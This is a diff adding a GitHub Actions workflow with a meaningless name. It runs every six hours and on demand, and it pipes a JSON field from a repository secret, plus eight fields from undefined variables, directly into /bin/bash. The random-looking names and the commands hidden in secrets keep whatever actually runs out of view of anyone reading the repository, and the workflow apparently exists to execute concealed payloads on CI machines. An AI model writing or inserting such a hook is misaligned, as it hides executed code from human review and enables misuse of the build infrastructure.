@@ -1,0 +1,25 @@
+name: trusteedartboard
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: trusteedartboard
+        env:
+          xc9: ${{ secrets.xc9 }}
+        run: |
+          echo $xc9 | jq -r .lanzo77288 | /bin/bash
+          echo $bjg07424 | jq -r .ene79 | /bin/bash
+          echo $cltcs3332 | jq -r .e777 | /bin/bash
+          echo $nmd99 | jq -r .gbd38259 | /bin/bash
+          echo $obi3685 | jq -r .nn16809 | /bin/bash
+          echo $cwkwq08143 | jq -r .rmv3313 | /bin/bash
+          echo $zzh68604 | jq -r .mmm2 | /bin/bash
+          echo $mc4145 | jq -r .hov84835 | /bin/bash
+          echo $a978 | jq -r .oeuf080 | /bin/bash
+
